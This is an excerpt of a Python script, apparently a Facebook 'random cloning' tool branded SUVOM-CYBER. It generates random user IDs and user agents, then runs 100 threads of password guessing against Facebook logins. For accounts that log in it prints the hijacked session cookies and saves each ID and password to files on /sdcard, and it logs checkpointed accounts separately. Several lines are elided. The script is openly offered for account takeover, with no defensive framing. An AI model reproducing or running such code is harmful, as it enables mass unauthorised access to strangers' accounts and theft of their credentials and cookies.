...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"Wall come To SUVOM-CYBER World , Bangladesh Random Cloning Start Please Wait\"")
logo=("""
...
\033[38;5;46m=======================\33[38;5;196m SUVOM \033[38;5;46m========================
...
\033[38;5;46m========================\33[38;5;196m𝙁𝙄𝙍𝙀\033[38;5;46m=========================="""
)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def love():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100043369874396')
    print(logo)
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as SUVOM:
        os.system('clear')
        print(logo)
        tl = str(len(user))
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[Suvom-Cyber-OK🔥] {uid} • {ps}" '  \n\033[1;33m [☣️]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [☣️] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/Suvom-Cyber-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Suvom-Cyber-CP👎] {uid} • {ps}")
                open('/sdcard/Suvom-Cyber-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
